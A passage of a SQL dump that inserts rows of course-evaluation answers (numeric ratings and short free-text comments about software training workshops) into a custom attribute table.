('evaluations', '267', 37, ''),
('evaluations', '267', 38, '1'),
('evaluations', '267', 39, '1'),
('evaluations', '268', 24, '0'),
('evaluations', '268', 25, '0'),
('evaluations', '268', 26, '0'),
('evaluations', '268', 27, '0'),
('evaluations', '268', 28, '2'),
('evaluations', '268', 30, '2'),
('evaluations', '268', 31, '0'),
('evaluations', '268', 32, '1'),
('evaluations', '268', 33, '1'),
('evaluations', '268', 34, '1'),
('evaluations', '268', 35, '0'),
('evaluations', '268', 36, 'No suggestions'),
('evaluations', '268', 37, ''),
('evaluations', '268', 38, '1'),
('evaluations', '268', 39, '0'),
('evaluations', '269', 24, '1'),
('evaluations', '269', 25, '1'),
('evaluations', '269', 26, '1'),
('evaluations', '269', 27, '1'),
('evaluations', '269', 28, '2'),
('evaluations', '269', 30, '1'),
('evaluations', '269', 31, '0'),
('evaluations', '269', 32, '1'),
('evaluations', '269', 33, '1'),
('evaluations', '269', 34, '1'),
('evaluations', '269', 35, '0'),
('evaluations', '269', 36, ''),
('evaluations', '269', 37, ''),
('evaluations', '269', 38, '1'),
('evaluations', '269', 39, '0'),
('evaluations', '27', 24, '1'),
('evaluations', '27', 25, '1'),
('evaluations', '27', 26, '0'),
('evaluations', '27', 27, '2'),
('evaluations', '27', 28, '1'),
('evaluations', '27', 30, '0'),
('evaluations', '27', 31, '1'),
('evaluations', '27', 32, '0'),
('evaluations', '27', 33, '1'),
('evaluations', '27', 34, '1'),
('evaluations', '27', 35, '1'),
('evaluations', '27', 36, 'this would make it better'),
('evaluations', '27', 37, 'That would make it better'),
('evaluations', '27', 38, '1'),
('evaluations', '27', 39, '3'),
('evaluations', '270', 24, '1'),
('evaluations', '270', 25, '1'),
('evaluations', '270', 26, '1'),
('evaluations', '270', 27, '1'),
('evaluations', '270', 28, '2'),
('evaluations', '270', 30, '2'),
('evaluations', '270', 31, '1'),
('evaluations', '270', 32, '1'),
('evaluations', '270', 33, '1'),
('evaluations', '270', 34, '1'),
('evaluations', '270', 35, '1'),
('evaluations', '270', 36, ''),
('evaluations', '270', 37, 'Good'),
('evaluations', '270', 38, '0'),
('evaluations', '270', 39, '1'),
('evaluations', '271', 24, '0'),
('evaluations', '271', 25, '0'),
('evaluations', '271', 26, '0'),
('evaluations', '271', 27, '0'),
('evaluations', '271', 28, '2'),
('evaluations', '271', 30, '2'),
('evaluations', '271', 31, '0'),
('evaluations', '271', 32, '1'),
('evaluations', '271', 33, '1'),
('evaluations', '271', 34, '0'),
('evaluations', '271', 35, '0'),
('evaluations', '271', 36, 'I think this workshop was great- the End of Class Exercise really helped.  Maybe another one incorporating the relationships tool.'),
('evaluations', '271', 37, ''),
('evaluations', '271', 38, '0'),
('evaluations', '271', 39, '1'),
('evaluations', '272', 24, '0'),
('evaluations', '272', 25, '1'),
('evaluations', '272', 26, '1'),
('evaluations', '272', 27, '0'),
('evaluations', '272', 28, '2'),
('evaluations', '272', 30, '1'),
('evaluations', '272', 31, '0'),
('evaluations', '272', 32, '0'),
('evaluations', '272', 33, '0'),
('evaluations', '272', 34, '1'),
('evaluations', '272', 35, '0'),
('evaluations', '272', 36, 'Split it up more through the week.'),
('evaluations', '272', 37, ''),
('evaluations', '272', 38, '0'),
('evaluations', '272', 39, '0'),
('evaluations', '273', 24, '0'),
('evaluations', '273', 25, '0'),
('evaluations', '273', 26, '1'),
('evaluations', '273', 27, '1'),
('evaluations', '273', 28, '2'),
('evaluations', '273', 30, '2'),
('evaluations', '273', 31, '1'),
('evaluations', '273', 32, '1'),
('evaluations', '273', 33, '1'),
('evaluations', '273', 34, '0'),
('evaluations', '273', 35, '1'),
('evaluations', '273', 36, 'Nothing it was a great presentation, good for the advance as well as the novice'),
('evaluations', '273', 37, ''),
('evaluations', '273', 38, '0'),
('evaluations', '273', 39, '0'),
('evaluations', '275', 24, '0'),
('evaluations', '275', 25, '0'),
('evaluations', '275', 26, '0'),
('evaluations', '275', 27, '0'),
('evaluations', '275', 28, '2'),
('evaluations', '275', 30, '2'),
('evaluations', '275', 31, '0'),
('evaluations', '275', 32, '1'),
('evaluations', '275', 33, '1'),
('evaluations', '275', 34, '0'),
('evaluations', '275', 35, '0'),
('evaluations', '275', 36, 'Other than sending out more prior information, I can''t think of a way.  Once the class started, it met my needs perfectly.'),
('evaluations', '275', 37, 'I didn''t receive any e-mail notifications, and did not know to print out materials beforehand.  Also, I was on the wait list for a previous class and never received notice that there was room.  My Classmate page indicates that I was absent.'),
('evaluations', '275', 38, '1'),
('evaluations', '275', 39, '3'),
('evaluations', '276', 24, '0'),
('evaluations', '276', 25, '0'),
('evaluations', '276', 26, '0'),
('evaluations', '276', 27, '0'),
('evaluations', '276', 28, '2'),
('evaluations', '276', 30, '2'),
('evaluations', '276', 31, '1'),
('evaluations', '276', 32, '0'),
('evaluations', '276', 33, '1'),
('evaluations', '276', 34, '0'),
('evaluations', '276', 35, '0'),
('evaluations', '276', 36, ''),
('evaluations', '276', 37, ''),
('evaluations', '276', 38, '0'),
('evaluations', '276', 39, '0'),
('evaluations', '277', 24, '0'),
('evaluations', '277', 25, '0'),
('evaluations', '277', 26, '0'),
('evaluations', '277', 27, '0'),
('evaluations', '277', 28, '2'),
('evaluations', '277', 30, '2'),
('evaluations', '277', 31, '0'),
('evaluations', '277', 32, '0'),
('evaluations', '277', 33, '0'),
('evaluations', '277', 34, '0'),
('evaluations', '277', 35, '0'),
('evaluations', '277', 36, ''),
('evaluations', '277', 37, ''),
('evaluations', '277', 38, '0'),
('evaluations', '277', 39, '0'),
('evaluations', '278', 24, '1'),
('evaluations', '278', 25, '1'),
('evaluations', '278', 26, '1'),
('evaluations', '278', 27, '1'),
('evaluations', '278', 28, '2'),
('evaluations', '278', 30, '2'),
('evaluations', '278', 31, '0'),
('evaluations', '278', 32, '1'),
('evaluations', '278', 33, '1'),
('evaluations', '278', 34, '1'),
('evaluations', '278', 35, '1'),
('evaluations', '278', 36, ''),
('evaluations', '278', 37, ''),
('evaluations', '278', 38, '1'),
('evaluations', '278', 39, '1'),
('evaluations', '279', 24, '0'),
('evaluations', '279', 25, '0'),
('evaluations', '279', 26, '0'),
('evaluations', '279', 27, '0'),
('evaluations', '279', 28, '2'),
('evaluations', '279', 30, '2'),
('evaluations', '279', 31, '1'),
('evaluations', '279', 32, '0'),
('evaluations', '279', 33, '0'),
('evaluations', '279', 34, '0'),
('evaluations', '279', 35, '0'),
('evaluations', '279', 36, ''),
('evaluations', '279', 37, ''),
('evaluations', '279', 38, '0'),
('evaluations', '279', 39, '0'),
('evaluations', '28', 24, '1'),
('evaluations', '28', 25, '0'),
('evaluations', '28', 26, '1'),
('evaluations', '28', 27, '1'),
('evaluations', '28', 28, '0'),
('evaluations', '28', 30, '0'),
('evaluations', '28', 31, '1'),
('evaluations', '28', 32, '1'),
('evaluations', '28', 33, '3'),
('evaluations', '28', 34, '3'),
('evaluations', '28', 35, '0'),
('evaluations', '28', 36, 'test2'),
('evaluations', '28', 37, 'this is a test'),
('evaluations', '28', 38, '1'),
('evaluations', '28', 39, '0'),
('evaluations', '280', 24, '0'),
('evaluations', '280', 25, '0'),
('evaluations', '280', 26, '0'),
('evaluations', '280', 27, '0'),
('evaluations', '280', 28, '2'),
('evaluations', '280', 30, '2'),
('evaluations', '280', 31, '1'),
('evaluations', '280', 32, '1'),
('evaluations', '280', 33, '1'),
('evaluations', '280', 34, '0'),
('evaluations', '280', 35, '1'),
('evaluations', '280', 36, ''),
('evaluations', '280', 37, ''),
('evaluations', '280', 38, '0'),
('evaluations', '280', 39, '0'),
('evaluations', '281', 24, '0'),
('evaluations', '281', 25, '0'),
('evaluations', '281', 26, '0'),
('evaluations', '281', 27, '0'),
('evaluations', '281', 28, '2'),
('evaluations', '281', 30, '2'),
('evaluations', '281', 31, '0'),
('evaluations', '281', 32, '1'),
('evaluations', '281', 33, '0'),
('evaluations', '281', 34, '0'),
('evaluations', '281', 35, '0'),
('evaluations', '281', 36, 'So far, so good.  This was my second class.'),
('evaluations', '281', 37, 'Great!'),
('evaluations', '281', 38, '1'),
('evaluations', '281', 39, '0'),
('evaluations', '282', 24, '1'),
('evaluations', '282', 25, '0'),
('evaluations', '282', 26, '0'),
('evaluations', '282', 27, '0'),
('evaluations', '282', 28, '2'),
('evaluations', '282', 30, '1'),
('evaluations', '282', 31, '0'),
('evaluations', '282', 32, '1'),
('evaluations', '282', 33, '0'),
('evaluations', '282', 34, '0'),
('evaluations', '282', 35, '0'),
('evaluations', '282', 36, ''),
('evaluations', '282', 37, 'Maybe it could be divided in two parts so there can be more time to practise.'),
('evaluations', '282', 38, '0'),
('evaluations', '282', 39, '1'),
('evaluations', '283', 24, '1'),
('evaluations', '283', 25, '1'),
('evaluations', '283', 26, '1'),
('evaluations', '283', 27, '1'),
('evaluations', '283', 28, '2'),
('evaluations', '283', 30, '2'),
('evaluations', '283', 31, '1'),
('evaluations', '283', 32, '1'),
('evaluations', '283', 33, '1'),
('evaluations', '283', 34, '1'),
('evaluations', '283', 35, '1'),
('evaluations', '283', 36, ''),
('evaluations', '283', 37, ''),
('evaluations', '283', 38, '1'),
('evaluations', '283', 39, '1'),
('evaluations', '284', 24, '0'),
('evaluations', '284', 25, '0'),
('evaluations', '284', 26, '0'),
('evaluations', '284', 27, '0'),
('evaluations', '284', 28, '2'),
('evaluations', '284', 30, '2'),
('evaluations', '284', 31, '1'),
('evaluations', '284', 32, '0'),
('evaluations', '284', 33, '0'),
('evaluations', '284', 34, '0'),
('evaluations', '284', 35, '0'),
('evaluations', '284', 36, 'None'),
('evaluations', '284', 37, 'None'),
('evaluations', '284', 38, '1'),
('evaluations', '284', 39, '1'),
('evaluations', '285', 24, '1'),
('evaluations', '285', 25, '0'),
('evaluations', '285', 26, '0'),
('evaluations', '285', 27, '0'),
('evaluations', '285', 28, '0'),
('evaluations', '285', 30, '2'),
('evaluations', '285', 31, '1'),
('evaluations', '285', 32, '1'),
('evaluations', '285', 33, '1'),
('evaluations', '285', 34, '1'),
('evaluations', '285', 35, '1'),
('evaluations', '285', 36, ''),
('evaluations', '285', 37, ''),
('evaluations', '285', 38, '0'),
('evaluations', '285', 39, '0'),
('evaluations', '286', 24, '0'),
('evaluations', '286', 25, '0'),
('evaluations', '286', 26, '0'),
('evaluations', '286', 27, '0'),
('evaluations', '286', 28, '2'),
('evaluations', '286', 30, '2'),
('evaluations', '286', 31, '0'),
('evaluations', '286', 32, '0'),
('evaluations', '286', 33, '0'),
('evaluations', '286', 34, '0'),
('evaluations', '286', 35, '0'),
('evaluations', '286', 36, 'very satisfied. Teacher was great.'),
('evaluations', '286', 37, 'no issues, very satisfied'),
('evaluations', '286', 38, '0'),
('evaluations', '286', 39, '0'),
('evaluations', '287', 24, '0'),
('evaluations', '287', 25, '0'),
('evaluations', '287', 26, '0'),
('evaluations', '287', 27, '0'),
('evaluations', '287', 28, '2'),
('evaluations', '287', 30, '2'),
('evaluations', '287', 31, '0'),
('evaluations', '287', 32, '0'),
('evaluations', '287', 33, '0'),
('evaluations', '287', 34, '0'),
('evaluations', '287', 35, '0'),
('evaluations', '287', 36, 'None'),
('evaluations', '287', 37, 'None'),
('evaluations', '287', 38, '1'),
('evaluations', '287', 39, '1'),
('evaluations', '288', 24, '0'),
('evaluations', '288', 25, '0'),
('evaluations', '288', 26, '0'),
('evaluations', '288', 27, '0'),
('evaluations', '288', 28, '2'),
('evaluations', '288', 30, '2'),
('evaluations', '288', 31, '0'),
('evaluations', '288', 32, '0'),
('evaluations', '288', 33, '0'),
('evaluations', '288', 34, '0'),
('evaluations', '288', 35, '0'),
('evaluations', '288', 36, ''),
('evaluations', '288', 37, ''),
('evaluations', '288', 38, '0'),
('evaluations', '288', 39, '0'),
('evaluations', '289', 24, '0'),
('evaluations', '289', 25, '0'),
('evaluations', '289', 26, '0'),
('evaluations', '289', 27, '1'),
('evaluations', '289', 28, '2'),
('evaluations', '289', 30, '2'),
('evaluations', '289', 31, '0'),
('evaluations', '289', 32, '0'),
('evaluations', '289', 33, '0'),
('evaluations', '289', 34, '0'),
('evaluations', '289', 35, '0'),
('evaluations', '289', 36, 'ENCOURAGE people to take it!'),
('evaluations', '289', 37, ''),
('evaluations', '289', 38, '1'),
('evaluations', '289', 39, '1'),
('evaluations', '29', 24, '1'),
('evaluations', '29', 25, '0'),
('evaluations', '29', 26, '0'),
('evaluations', '29', 27, '0'),
('evaluations', '29', 28, '2'),
('evaluations', '29', 30, '2'),
('evaluations', '29', 31, '0'),
('evaluations', '29', 32, '1'),
('evaluations', '29', 33, '4'),
('evaluations', '29', 34, '1'),
('evaluations', '29', 35, '0'),
('evaluations', '29', 36, 'Um... I would have liked to download the slides beforehand so I could take notes on them. That''s it.'),
('evaluations', '29', 37, 'Classmate is AWESOME!'),
('evaluations', '29', 38, '1'),
('evaluations', '29', 39, '1'),
('evaluations', '290', 24, '0'),
('evaluations', '290', 25, '0'),
('evaluations', '290', 26, '0'),
('evaluations', '290', 27, '0'),
('evaluations', '290', 28, '2'),
('evaluations', '290', 30, '2'),
('evaluations', '290', 31, '0'),
('evaluations', '290', 32, '0'),
('evaluations', '290', 33, '0'),
('evaluations', '290', 34, '0'),
('evaluations', '290', 35, '0'),
('evaluations', '290', 36, 'I think it is great. I appreciate the instructor.'),
('evaluations', '290', 37, ''),
('evaluations', '290', 38, '0'),
('evaluations', '290', 39, '0'),
('evaluations', '291', 24, '1'),
('evaluations', '291', 25, '0'),
('evaluations', '291', 26, '0'),
('evaluations', '291', 27, '0'),
('evaluations', '291', 28, '2'),
('evaluations', '291', 30, '2'),
('evaluations', '291', 31, '2'),
('evaluations', '291', 32, '1'),
('evaluations', '291', 33, '1'),
('evaluations', '291', 34, '0'),
('evaluations', '291', 35, '1'),
('evaluations', '291', 36, ''),
('evaluations', '291', 37, ''),
('evaluations', '291', 38, '1'),
('evaluations', '291', 39, '1'),
('evaluations', '292', 24, '0'),
('evaluations', '292', 25, '0'),
('evaluations', '292', 26, '0'),
('evaluations', '292', 27, '0'),
('evaluations', '292', 28, '2'),
('evaluations', '292', 30, '2'),
('evaluations', '292', 31, '0'),
('evaluations', '292', 32, '0'),
('evaluations', '292', 33, '1'),
('evaluations', '292', 34, '0'),
('evaluations', '292', 35, '0'),
('evaluations', '292', 36, ''),
('evaluations', '292', 37, ''),
('evaluations', '292', 38, '0'),
('evaluations', '292', 39, '0'),
('evaluations', '293', 24, '0'),
('evaluations', '293', 25, '0'),
('evaluations', '293', 26, '0'),
('evaluations', '293', 27, '0'),
('evaluations', '293', 28, '2'),
('evaluations', '293', 30, '2'),
('evaluations', '293', 31, '0'),
('evaluations', '293', 32, '1'),
('evaluations', '293', 33, '0'),
('evaluations', '293', 34, '0'),
('evaluations', '293', 35, '0'),
('evaluations', '293', 36, ''),
('evaluations', '293', 37, ''),
('evaluations', '293', 38, '0'),
('evaluations', '293', 39, '0'),
('evaluations', '294', 24, '0'),
('evaluations', '294', 25, '0'),
('evaluations', '294', 26, '0'),
('evaluations', '294', 27, '0'),
('evaluations', '294', 28, '2'),
('evaluations', '294', 30, '2'),
('evaluations', '294', 31, '0'),
('evaluations', '294', 32, '0'),
('evaluations', '294', 33, '1'),
('evaluations', '294', 34, '0'),
('evaluations', '294', 35, '0'),
('evaluations', '294', 36, 'Have portable heaters ready for COLD days like today!'),
('evaluations', '294', 37, ''),
('evaluations', '294', 38, '0'),
('evaluations', '294', 39, '0'),
('evaluations', '295', 24, '0'),
('evaluations', '295', 25, '0'),
('evaluations', '295', 26, '0'),
('evaluations', '295', 27, '0'),
('evaluations', '295', 28, '2'),
('evaluations', '295', 30, '2'),
('evaluations', '295', 31, '0'),
('evaluations', '295', 32, '1'),
('evaluations', '295', 33, '1'),
('evaluations', '295', 34, '0'),
('evaluations', '295', 35, '0'),
('evaluations', '295', 36, ''),
('evaluations', '295', 37, ''),
('evaluations', '295', 38, '1'),
('evaluations', '295', 39, '1'),
('evaluations', '296', 24, '1'),
('evaluations', '296', 25, '1'),
('evaluations', '296', 26, '1'),
('evaluations', '296', 27, '1'),
('evaluations', '296', 28, '2'),
('evaluations', '296', 30, '2'),
('evaluations', '296', 31, '1'),
('evaluations', '296', 32, '1'),
('evaluations', '296', 33, '1'),
('evaluations', '296', 34, '1'),
('evaluations', '296', 35, '1'),
('evaluations', '296', 36, ''),
('evaluations', '296', 37, ''),
('evaluations', '296', 38, '1'),
('evaluations', '296', 39, '1'),
('evaluations', '297', 24, '0'),
('evaluations', '297', 25, '0'),
('evaluations', '297', 26, '0'),
('evaluations', '297', 27, '0'),
('evaluations', '297', 28, '2'),
('evaluations', '297', 30, '2'),
('evaluations', '297', 31, '0'),
('evaluations', '297', 32, '0'),
('evaluations', '297', 33, '0'),
('evaluations', '297', 34, '0'),
('evaluations', '297', 35, '0'),
('evaluations', '297', 36, ''),
('evaluations', '297', 37, ''),
('evaluations', '297', 38, '0'),
('evaluations', '297', 39, '0'),
('evaluations', '298', 24, '0'),
('evaluations', '298', 25, '0'),
('evaluations', '298', 26, '0'),
('evaluations', '298', 27, '0'),
('evaluations', '298', 28, '2'),
('evaluations', '298', 30, '2'),
('evaluations', '298', 31, '1'),
('evaluations', '298', 32, '0'),
('evaluations', '298', 33, '0'),
('evaluations', '298', 34, '0'),
('evaluations', '298', 35, '0'),
('evaluations', '298', 36, ''),
('evaluations', '298', 37, ''),
('evaluations', '298', 38, '0'),
('evaluations', '298', 39, '0'),
('evaluations', '299', 24, '0'),
('evaluations', '299', 25, '0'),
('evaluations', '299', 26, '0'),
('evaluations', '299', 27, '0'),
('evaluations', '299', 28, '2'),
('evaluations', '299', 30, '2'),
('evaluations', '299', 31, '0'),
('evaluations', '299', 32, '0'),
('evaluations', '299', 33, '0'),
('evaluations', '299', 34, '0'),
('evaluations', '299', 35, '0'),
('evaluations', '299', 36, ''),
('evaluations', '299', 37, ''),
('evaluations', '299', 38, '0'),
('evaluations', '299', 39, '0'),
('evaluations', '30', 24, '0'),
('evaluations', '30', 25, '0'),
('evaluations', '30', 26, '0'),
('evaluations', '30', 27, '0'),
('evaluations', '30', 28, '2'),
('evaluations', '30', 30, '2'),
('evaluations', '30', 31, '0'),
('evaluations', '30', 32, '0'),
('evaluations', '30', 33, '0'),
('evaluations', '30', 34, '0'),
('evaluations', '30', 35, '0'),
('evaluations', '30', 36, ''),
('evaluations', '30', 37, ''),
('evaluations', '30', 38, '0'),
('evaluations', '30', 39, '0'),
('evaluations', '300', 24, '0'),
('evaluations', '300', 25, '0'),
('evaluations', '300', 26, '0'),
('evaluations', '300', 27, '0'),
('evaluations', '300', 28, '2'),
('evaluations', '300', 30, '2'),
('evaluations', '300', 31, '0'),
('evaluations', '300', 32, '0'),
('evaluations', '300', 33, '0'),
('evaluations', '300', 34, '0'),
('evaluations', '300', 35, '0'),
('evaluations', '300', 36, 'My instructor was so good I don''t have that much time now to try and think hard enough to come up with anything.'),
('evaluations', '300', 37, ''),
('evaluations', '300', 38, '0'),
('evaluations', '300', 39, '0'),
('evaluations', '301', 24, '0'),
('evaluations', '301', 25, '0'),
('evaluations', '301', 26, '0'),
('evaluations', '301', 27, '0'),
('evaluations', '301', 28, '2'),
('evaluations', '301', 30, '2'),
('evaluations', '301', 31, '0'),
('evaluations', '301', 32, '0'),
('evaluations', '301', 33, '0'),
('evaluations', '301', 34, '0'),
('evaluations', '301', 35, '0'),
('evaluations', '301', 36, ''),
('evaluations', '301', 37, ''),
('evaluations', '301', 38, '0'),
('evaluations', '301', 39, '0'),
('evaluations', '302', 24, '0'),
('evaluations', '302', 25, '0'),
('evaluations', '302', 26, '1'),
('evaluations', '302', 27, '0'),
('evaluations', '302', 28, '2'),
('evaluations', '302', 30, '2'),
('evaluations', '302', 31, '0'),
('evaluations', '302', 32, '0'),
('evaluations', '302', 33, '1'),
('evaluations', '302', 34, '0'),
('evaluations', '302', 35, '0'),
('evaluations', '302', 36, ''),
('evaluations', '302', 37, ''),
('evaluations', '302', 38, '1'),
('evaluations', '302', 39, '0'),
('evaluations', '303', 24, '0'),
('evaluations', '303', 25, '0'),
('evaluations', '303', 26, '0'),
('evaluations', '303', 27, '0'),
('evaluations', '303', 28, '2'),
('evaluations', '303', 30, '1'),
('evaluations', '303', 31, '1'),
('evaluations', '303', 32, '1'),
('evaluations', '303', 33, '0'),
('evaluations', '303', 34, '0'),
('evaluations', '303', 35, '0'),
('evaluations', '303', 36, 'Classroom is not very good.  We''ve had an issue each time we''ve had the class. Air Conditioner running at about 40 degrees. Construction shaking building ect.'),
('evaluations', '303', 37, 'good.'),
('evaluations', '303', 38, '0'),
('evaluations', '303', 39, '1'),
('evaluations', '304', 24, '0'),
('evaluations', '304', 25, '0'),
('evaluations', '304', 26, '0'),
('evaluations', '304', 27, '0'),
('evaluations', '304', 28, '2'),
('evaluations', '304', 30, '2'),
('evaluations', '304', 31, '1'),
('evaluations', '304', 32, '0'),
('evaluations', '304', 33, '0'),
('evaluations', '304', 34, '0');
INSERT INTO `oit_tbl_ot_custom_attribute_value` (`objectId`, `parentId`, `attributeId`, `value`) VALUES
('evaluations', '304', 35, '0'),
('evaluations', '304', 36, 'This series is great! Thanks David.'),
('evaluations', '304', 37, ''),
('evaluations', '304', 38, '0'),
('evaluations', '304', 39, '0'),
('evaluations', '305', 24, '1'),
('evaluations', '305', 25, '1'),
('evaluations', '305', 26, '1'),
('evaluations', '305', 27, '0'),
('evaluations', '305', 28, '2'),
('evaluations', '305', 30, '2'),
('evaluations', '305', 31, '1'),
('evaluations', '305', 32, '1'),
('evaluations', '305', 33, '1'),
('evaluations', '305', 34, '1'),
('evaluations', '305', 35, '1'),
('evaluations', '305', 36, ''),
('evaluations', '305', 37, ''),
('evaluations', '305', 38, '0'),
('evaluations', '305', 39, '1'),
('evaluations', '306', 24, '1'),
('evaluations', '306', 25, '1'),
('evaluations', '306', 26, '1'),
('evaluations', '306', 27, '1'),
('evaluations', '306', 28, '2'),
('evaluations', '306', 30, '2'),
('evaluations', '306', 31, '0'),
('evaluations', '306', 32, '1'),
('evaluations', '306', 33, '1'),
('evaluations', '306', 34, '1'),
('evaluations', '306', 35, '1'),
('evaluations', '306', 36, ''),
('evaluations', '306', 37, ''),
('evaluations', '306', 38, '1'),
('evaluations', '306', 39, '1'),
('evaluations', '307', 24, '1'),
('evaluations', '307', 25, '1'),
('evaluations', '307', 26, '0'),
('evaluations', '307', 27, '0'),
('evaluations', '307', 28, '2'),
('evaluations', '307', 30, '2'),
('evaluations', '307', 31, '1'),
('evaluations', '307', 32, '1'),
('evaluations', '307', 33, '1'),
('evaluations', '307', 34, '2'),
('evaluations', '307', 35, '1'),
('evaluations', '307', 36, 'You could include "Forms" in the class..like the Class title indicates.'),
('evaluations', '307', 37, ''),
('evaluations', '307', 38, '0'),
('evaluations', '307', 39, '0'),
('evaluations', '308', 24, '0'),
('evaluations', '308', 25, '0'),
('evaluations', '308', 26, '0'),
('evaluations', '308', 27, '0'),
('evaluations', '308', 28, '2'),
('evaluations', '308', 30, '2'),
('evaluations', '308', 31, '1'),
('evaluations', '308', 32, '0'),
('evaluations', '308', 33, '0'),
('evaluations', '308', 34, '0'),
('evaluations', '308', 35, '0'),
('evaluations', '308', 36, ''),
('evaluations', '308', 37, ''),
('evaluations', '308', 38, '0'),
('evaluations', '308', 39, '0'),
('evaluations', '309', 24, '0'),
('evaluations', '309', 25, '0'),
('evaluations', '309', 26, '0'),
('evaluations', '309', 27, '0'),
('evaluations', '309', 28, '2'),
('evaluations', '309', 30, '2'),
('evaluations', '309', 31, '0'),
('evaluations', '309', 32, '0'),
('evaluations', '309', 33, '0'),
('evaluations', '309', 34, '0'),
('evaluations', '309', 35, '0'),
('evaluations', '309', 36, ''),
('evaluations', '309', 37, ''),
('evaluations', '309', 38, '1'),
('evaluations', '309', 39, '0'),
('evaluations', '31', 24, '0'),
('evaluations', '31', 25, '0'),
('evaluations', '31', 26, '0'),
('evaluations', '31', 27, '0'),
('evaluations', '31', 28, '2'),
('evaluations', '31', 30, '2'),
('evaluations', '31', 31, '1'),
('evaluations', '31', 32, '1'),
('evaluations', '31', 33, '1'),
('evaluations', '31', 34, '0'),
('evaluations', '31', 35, '1'),
('evaluations', '31', 36, 'Making the class do an example would be good'),
('evaluations', '31', 37, 'Needs an Evaluate Class link on the class page - only saw it on the My Appointments page.'),
('evaluations', '31', 38, '0'),
('evaluations', '31', 39, '1'),
('evaluations', '310', 24, '1'),
('evaluations', '310', 25, '1'),
('evaluations', '310', 26, '1'),
('evaluations', '310', 27, '1'),
('evaluations', '310', 28, '2'),
('evaluations', '310', 30, '2'),
('evaluations', '310', 31, '1'),
('evaluations', '310', 32, '1'),
('evaluations', '310', 33, '1'),
('evaluations', '310', 34, '1'),
('evaluations', '310', 35, '1'),
('evaluations', '310', 36, ''),
('evaluations', '310', 37, ''),
('evaluations', '310', 38, '1'),
('evaluations', '310', 39, '1'),
('evaluations', '311', 24, '1'),
('evaluations', '311', 25, '0'),
('evaluations', '311', 26, '0'),
('evaluations', '311', 27, '0'),
('evaluations', '311', 28, '0'),
('evaluations', '311', 30, '2'),
('evaluations', '311', 31, '1'),
('evaluations', '311', 32, '1'),
('evaluations', '311', 33, '1'),
('evaluations', '311', 34, '1'),
('evaluations', '311', 35, '1'),
('evaluations', '311', 36, ''),
('evaluations', '311', 37, ''),
('evaluations', '311', 38, '0'),
('evaluations', '311', 39, '0'),
('evaluations', '312', 24, '0'),
('evaluations', '312', 25, '0'),
('evaluations', '312', 26, '0'),
('evaluations', '312', 27, '0'),
('evaluations', '312', 28, '2'),
('evaluations', '312', 30, '2'),
('evaluations', '312', 31, '0'),
('evaluations', '312', 32, '1'),
('evaluations', '312', 33, '1'),
('evaluations', '312', 34, '0'),
('evaluations', '312', 35, '0'),
('evaluations', '312', 36, 'We did get into Mail Merge, but I''d love it to be included in the class proper.  Excellent walk-through though.'),
('evaluations', '312', 37, 'Great!'),
('evaluations', '312', 38, '0'),
('evaluations', '312', 39, '0'),
('evaluations', '313', 24, '1'),
('evaluations', '313', 25, '0'),
('evaluations', '313', 26, '0'),
('evaluations', '313', 27, '0'),
('evaluations', '313', 28, '0'),
('evaluations', '313', 30, '1'),
('evaluations', '313', 31, '1'),
('evaluations', '313', 32, '1'),
('evaluations', '313', 33, '4'),
('evaluations', '313', 34, '0'),
('evaluations', '313', 35, '0'),
('evaluations', '313', 36, 'The workshop is good.  Part 3 was above my current scope as I do not use Excel at this level in my own work.  Teacher is excellent. Part 1 and 2 were more relevant to my particular situation - learning curve is sharp for me for Part 3.  So it is important for "beginners" to know that Parts 1 and  2 will suffice.'),
('evaluations', '313', 37, ''),
('evaluations', '313', 38, '0'),
('evaluations', '313', 39, '0'),
('evaluations', '314', 24, '0'),
('evaluations', '314', 25, '0'),
('evaluations', '314', 26, '0'),
('evaluations', '314', 27, '0'),
('evaluations', '314', 28, '2'),
('evaluations', '314', 30, '2'),
('evaluations', '314', 31, '0'),
('evaluations', '314', 32, '0'),
('evaluations', '314', 33, '0'),
('evaluations', '314', 34, '0'),
('evaluations', '314', 35, '0'),
('evaluations', '314', 36, 'I missed the opportunity to evaluate Excel 2 which was taught by Mrs. Baker also.  Please duplicate this response for that workshop also.  The classes are great and Twanda Baker is wonderful!'),
('evaluations', '314', 37, ''),
('evaluations', '314', 38, '0'),
('evaluations', '314', 39, '0'),
('evaluations', '315', 24, '0'),
('evaluations', '315', 25, '1'),
('evaluations', '315', 26, '0'),
('evaluations', '315', 27, '0'),
('evaluations', '315', 28, '2'),
('evaluations', '315', 30, '2'),
('evaluations', '315', 31, '1'),
('evaluations', '315', 32, '0'),
('evaluations', '315', 33, '1'),
('evaluations', '315', 34, '0'),
('evaluations', '315', 35, '1'),
('evaluations', '315', 36, ''),
('evaluations', '315', 37, ''),
('evaluations', '315', 38, '0'),
('evaluations', '315', 39, '1'),
('evaluations', '316', 24, '0'),
('evaluations', '316', 25, '1'),
('evaluations', '316', 26, '0'),
('evaluations', '316', 27, '1'),
('evaluations', '316', 28, '2'),
('evaluations', '316', 30, '2'),
('evaluations', '316', 31, '0'),
('evaluations', '316', 32, '1'),
('evaluations', '316', 33, '1'),
('evaluations', '316', 34, '0'),
('evaluations', '316', 35, '0'),
('evaluations', '316', 36, 'update handouts to reflect changes for 2007 (but you knew this...)'),
('evaluations', '316', 37, ''),
('evaluations', '316', 38, '1'),
('evaluations', '316', 39, '1'),
('evaluations', '317', 24, '0'),
('evaluations', '317', 25, '0'),
('evaluations', '317', 26, '0'),
('evaluations', '317', 27, '0'),
('evaluations', '317', 28, '2'),
('evaluations', '317', 30, '2'),
('evaluations', '317', 31, '0'),
('evaluations', '317', 32, '0'),
('evaluations', '317', 33, '0'),
('evaluations', '317', 34, '0'),
('evaluations', '317', 35, '0'),
('evaluations', '317', 36, ''),
('evaluations', '317', 37, ''),
('evaluations', '317', 38, '0'),
('evaluations', '317', 39, '0'),
('evaluations', '318', 24, '0'),
('evaluations', '318', 25, '0'),
('evaluations', '318', 26, '0'),
('evaluations', '318', 27, '0'),
('evaluations', '318', 28, '2'),
('evaluations', '318', 30, '1'),
('evaluations', '318', 31, '0'),
('evaluations', '318', 32, '1'),
('evaluations', '318', 33, '1'),
('evaluations', '318', 34, '0'),
('evaluations', '318', 35, '0'),
('evaluations', '318', 36, ''),
('evaluations', '318', 37, ''),
('evaluations', '318', 38, '0'),
('evaluations', '318', 39, '0'),
('evaluations', '319', 24, '1'),
('evaluations', '319', 25, '1'),
('evaluations', '319', 26, '1'),
('evaluations', '319', 27, '1'),
('evaluations', '319', 28, '2'),
('evaluations', '319', 30, '1'),
('evaluations', '319', 31, '1'),
('evaluations', '319', 32, '1'),
('evaluations', '319', 33, '1'),
('evaluations', '319', 34, '1'),
